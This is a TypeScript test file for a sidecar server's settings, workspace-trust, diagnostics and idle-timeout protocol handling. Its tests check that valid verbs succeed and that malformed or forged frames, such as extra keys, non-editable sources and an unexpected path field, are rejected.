/** makeServer with only a (fake) settings domain wired. */
function makeSettingsServer(runVerb?: SidecarSettingsDomain['runVerb']): SidecarServer {
  return makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    fakeSettingsDomain(runVerb),
  )
}

test('P4-19 — a valid settings.setValue produces an ok result and re-broadcasts the snapshot', () => {
  let seen: SettingsVerbMessage | null = null
  const server = makeSettingsServer(verb => {
    seen = verb
    return { ok: true, message: `Updated ${verb.key}.`, changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(f => f.kind === 'settings.snapshot').length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w1',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )

  const result = received.find(f => f.kind === 'settings.result')
  expect(result && result.kind === 'settings.result' && result.ok).toBe(true)
  expect(result && result.kind === 'settings.result' && result.requestId).toBe('w1')
  expect(result && result.kind === 'settings.result' && result.verb).toBe('settings.setValue')
  // The domain received exactly the validated verb.
  expect(seen).toMatchObject({ source: 'userSettings', key: 'includeCoAuthoredBy', value: false })
  // A fresh snapshot was re-broadcast after the write landed.
  expect(received.filter(f => f.kind === 'settings.snapshot').length).toBeGreaterThan(before)
})

test('P4-19 — rejects a settings verb carrying an unexpected key (checkStrictKeys)', () => {
  const server = makeSettingsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
        updatedPermissions: [],
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  // The forged frame never reached a result.
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
})

test('P4-19 — rejects a non-editable source (policy) at the schema boundary', () => {
  let called = false
  const server = makeSettingsServer(() => {
    called = true
    return { ok: true, message: 'Updated.', changed: true }
  })
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'policySettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  // Rejected before the domain — no disk touch attempted.
  expect(called).toBe(false)
})

test('P4-19 — rejects a mistyped value and a non-allowlisted key at the value gate', () => {
  const server = makeSettingsServer()
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // fastMode is boolean → a string value is rejected.
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w1',
        source: 'userSettings',
        key: 'fastMode',
        value: 'on',
      } as unknown as ClientFrame['message'],
    }),
  )
  // apiKey is NOT in the editable allowlist → rejected (never written).
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w2',
        source: 'userSettings',
        key: 'apiKey',
        value: 'sk-live-X',
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.filter(f => f.kind === 'error' && f.code === 'bad_request').length).toBe(2)
  expect(received.some(f => f.kind === 'settings.result')).toBe(false)
})

test('P4-19 — a settings verb with no settings domain fails closed (internal_error)', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'settings.setValue',
        requestId: 'w',
        source: 'userSettings',
        key: 'includeCoAuthoredBy',
        value: false,
      } as unknown as ClientFrame['message'],
    }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'internal_error')).toBe(true)
})

/* ------------------------------------------------------------------------- *
 * CC-3 — idle self-exit timer (deterministic unit companion to
 * idleTtl.probe.test.ts). Proves the arm/clear/re-arm state machine directly.
 * ------------------------------------------------------------------------- */

test('CC-3 — onIdle fires after the TTL when no connection ever attaches', async () => {
  let idleCount = 0
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    idleTtlMs: 40,
    onIdle: () => {
      idleCount++
    },
    log: () => {},
  })
  servers.push(server)
  // Constructed with zero connections → the timer is already counting down.
  await Bun.sleep(120)
  expect(idleCount).toBe(1)
})

test('CC-3 — an open connection cancels the idle timer; closing it re-arms the countdown', async () => {
  let idleCount = 0
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller: new AppSessionController(probeAdapter()),
    idleTtlMs: 40,
    onIdle: () => {
      idleCount++
    },
    log: () => {},
  })
  servers.push(server)

  const { socket } = makeSocket()
  const conn = server.addConnection(socket)
  // A live connection must never idle-exit, no matter how long it stays quiet.
  await Bun.sleep(120)
  expect(idleCount).toBe(0)

  // Dropping the last connection re-arms the countdown (the crash-orphan path).
  server.removeConnection(conn)
  await Bun.sleep(120)
  expect(idleCount).toBe(1)
})

/* ------------------------------------------------------------------------- *
 * P4-14 — workspace-trust + diagnostics read-seams
 * ------------------------------------------------------------------------- */

function fakeWorkspaceTrust(
  snapshot: ReturnType<SidecarWorkspaceTrustDomain['getSnapshot']>,
  acceptTrust: () => WorkspaceTrustAcceptResult = () => ({
    ok: true,
    message: 'Workspace trusted.',
    changed: true,
  }),
): SidecarWorkspaceTrustDomain {
  return { getSnapshot: () => snapshot, acceptTrust }
}

function fakeDiagnostics(
  snapshot: ReturnType<SidecarDiagnosticsDomain['getSnapshot']>,
): SidecarDiagnosticsDomain {
  return { getSnapshot: () => snapshot }
}

test('P4-14 — attach emits a workspace-trust.snapshot carrying the domain read', () => {
  const workspaceTrust = fakeWorkspaceTrust({ trusted: true, detectedRepo: 'acme/cat-code' })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    workspaceTrust,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'workspace-trust.snapshot')
  expect(snap).toEqual({
    kind: 'workspace-trust.snapshot',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    workspaceTrust: { trusted: true, detectedRepo: 'acme/cat-code' },
  })
})

test('P4-14 — a null workspace-trust read degrades to no frame, never strands the connection', () => {
  const workspaceTrust = fakeWorkspaceTrust(null)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    workspaceTrust,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'workspace-trust.snapshot')).toBe(false)
  // The rest of the attach sequence still ran (ready always fires first).
  expect(received[0]?.kind).toBe('ready')
})

/* ------------------------------------------------------------------------- *
 * P4-15 — workspace-trust ACCEPT verb (the session-create trust gate) boundary
 * ------------------------------------------------------------------------- */

function makeWorkspaceTrustServer(
  snapshot: ReturnType<SidecarWorkspaceTrustDomain['getSnapshot']>,
  acceptTrust?: () => WorkspaceTrustAcceptResult,
): SidecarServer {
  return makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    fakeWorkspaceTrust(snapshot, acceptTrust),
  )
}

test('P4-15 — a valid workspace.trust accept produces an ok result and re-broadcasts the trust snapshot', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: 'acme/x' },
    () => {
      called++
      return { ok: true, message: 'Workspace trusted.', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(
    f => f.kind === 'workspace-trust.snapshot',
  ).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
        requestId: 't1',
      } as unknown as ClientFrame['message'],
    }),
  )

  const result = received.find(f => f.kind === 'workspace.trust.result')
  expect(result && result.kind === 'workspace.trust.result' && result.ok).toBe(true)
  expect(
    result && result.kind === 'workspace.trust.result' && result.requestId,
  ).toBe('t1')
  expect(called).toBe(1)
  // A fresh trust snapshot (now trusted:true) was re-broadcast after the write.
  expect(
    received.filter(f => f.kind === 'workspace-trust.snapshot').length,
  ).toBeGreaterThan(before)
})

test('P4-15 — an already-trusted accept returns ok but does NOT re-broadcast (changed:false)', () => {
  const server = makeWorkspaceTrustServer(
    { trusted: true, detectedRepo: null },
    () => ({ ok: true, message: 'Workspace already trusted.', changed: false }),
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  const before = received.filter(
    f => f.kind === 'workspace-trust.snapshot',
  ).length

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
        requestId: 't2',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(
    received.some(f => f.kind === 'workspace.trust.result' && f.ok),
  ).toBe(true)
  expect(
    received.filter(f => f.kind === 'workspace-trust.snapshot').length,
  ).toBe(before)
})

test('P4-15 — rejects a workspace.trust verb carrying a renderer-authored path (HC1 / checkStrictKeys)', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: null },
    () => {
      called++
      return { ok: true, message: 'Workspace trusted.', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      // A renderer-supplied `path` is exactly what HC1 forbids — rejected before
      // the verb ever reaches the domain (no path field exists in the contract).
      message: {
        type: 'workspace.trust',
        requestId: 't',
        path: '/etc',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'workspace.trust.result')).toBe(false)
  expect(called).toBe(0)
})

test('P4-15 — rejects a workspace.trust verb missing requestId at the schema boundary', () => {
  let called = 0
  const server = makeWorkspaceTrustServer(
    { trusted: false, detectedRepo: null },
    () => {
      called++
      return { ok: true, message: 'x', changed: true }
    },
  )
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    encodeFrame({
      protocolVersion: PROTOCOL_VERSION,
      sessionId: SESSION,
      message: {
        type: 'workspace.trust',
      } as unknown as ClientFrame['message'],
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
  expect(received.some(f => f.kind === 'workspace.trust.result')).toBe(false)
  expect(called).toBe(0)
})

test('P4-14 — attach emits a diagnostics.snapshot carrying the domain read', () => {
  const diagnostics = fakeDiagnostics({
    version: '2.1.87-dev',
    mainLoopModel: null,
    sandboxEnabled: true,
    installationWarnings: [],
    healthWarnings: ['Found invalid settings files: /tmp/x.json. They will be ignored.'],
    memoryWarnings: [],
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    diagnostics,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  const snap = received.find(f => f.kind === 'diagnostics.snapshot')
  expect(snap).toEqual({
    kind: 'diagnostics.snapshot',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    diagnostics: {
      version: '2.1.87-dev',
      mainLoopModel: null,
      sandboxEnabled: true,
      installationWarnings: [],
      healthWarnings: ['Found invalid settings files: /tmp/x.json. They will be ignored.'],
      memoryWarnings: [],
    },
  })
})

test('P4-14 — a null diagnostics read degrades to no frame, never strands the connection', () => {
  const diagnostics = fakeDiagnostics(null)
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    diagnostics,
  )
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'diagnostics.snapshot')).toBe(false)
  expect(received[0]?.kind).toBe('ready')
})

test('P4-14 — absent domains (probe mode) emit neither snapshot, without throwing', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  server.addConnection(socket)

  expect(received.some(f => f.kind === 'workspace-trust.snapshot')).toBe(false)
  expect(received.some(f => f.kind === 'diagnostics.snapshot')).toBe(false)
})
